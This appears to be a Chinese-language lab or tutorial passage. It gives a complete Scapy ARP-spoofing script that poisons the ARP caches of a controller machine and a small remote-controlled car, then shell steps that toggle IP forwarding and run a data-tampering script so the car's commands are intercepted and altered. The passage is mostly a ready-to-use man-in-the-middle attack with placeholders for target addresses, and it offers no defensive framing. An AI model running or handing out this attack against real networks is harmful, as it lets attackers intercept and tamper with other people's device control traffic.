arp欺骗脚本arp-cheat.py：
#!/usr/bin/python
from scapy.all import *
from time import *

IP_A    = "此处填写控制机的ip"

IP_B    = "此处填写小车ip"

MAC_M     = "此处填写攻击机真机mac地址"

print("SENDING SPOOFED ARP REQUEST......")

ether = Ether()
ether.dst = "ff:ff:ff:ff:ff:ff"
ether.src = "02:42:c0:a8:3c:03"

arp = ARP()
arp.psrc  = IP_B
arp.hwsrc = MAC_M
arp.pdst  = IP_A
arp.op = 1
frame1 = ether/arp
arp2 = ARP()
arp2.psrc = IP_A
arp2.hwsrc = MAC_M
arp2.pdst = IP_B
arp2.op = 1
frame2 = ether/arp2
while 1:
  sendp(frame1)
  sendp(frame2)
  sleep(5)

3.在攻击机上运行arp欺骗脚本，同时开启ip转发
sudo python3 arp-cheat.py
sudo -i
echo 1 > /proc/sys/net/ipv4/ip_forward 								#开启IP转发
#小车可以移动
echo 0 > /proc/sys/net/ipv4/ip_forward
#小车无法移动
4.控制机关闭ip转发，攻击机端运行数据篡改脚本
sudo python3 datacheat.py
#此时控制小车发现可以移动，因为数据篡改脚本提供了ip转发服务，同时输入的指令会反作用在小车上（迫于网络原因可能并不好，小车能动就行）
